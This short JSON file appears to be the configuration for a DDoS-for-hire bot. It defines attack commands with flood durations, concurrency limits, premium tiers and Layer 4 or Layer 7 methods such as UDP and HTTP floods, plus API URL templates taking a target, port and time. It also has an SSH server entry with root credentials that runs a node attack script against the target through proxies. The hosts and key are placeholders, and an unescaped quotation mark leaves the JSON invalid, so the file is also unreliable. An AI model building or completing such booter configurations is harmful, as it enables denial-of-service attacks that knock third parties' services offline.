[

  {
    "Command":"/gamehemker",
    "MaxTime":900,
    "MaxConc":10,
    "Running":0,
    "Premium":false,
    "Layer":4,
    "Apis":[
      "https://www.google.com/api?key=yesthiskey&target=<<$TARGET>>&port=<<$PORT>>&time=<<$TIME>>&method=UDP-FUCK",
      "http://google.com/api?key=yesthiskey&target=<<$TARGET>>&port=<<$PORT>>&dtime=<<$TIME>>&method=UDP"
    ],
    "Servers": []
  },
  {
    "Command":"/hemker",
    "MaxTime":120,
    "MaxConc":2,
    "Running":0,
    "Premium":true,
    "Layer":7,
    "Apis":[
      "https://www.google.com/api?key=yesthiskey&target=<<$TARGET>>&port=<<$PORT>>&time=<<$TIME>>&method=HTTP",
      "http://google.com/api?key=yesthiskey&target=<<$TARGET>>&port=<<$PORT>>&time=<<$TIME>>&method=HTTPS"
    ],
    "Servers": [
      {
        "Ip": "8.8.8.8",
        "Port": "22",
        "User": "root",
        "Password": "pass",
        "Command": "node test.js <<$TARGET>> <<$PORT>> <<$TIME>> proxy.js (REPLACE TO "Servers": [] IF U NOT HAVE DLC)"
      }
    ]
  }

]
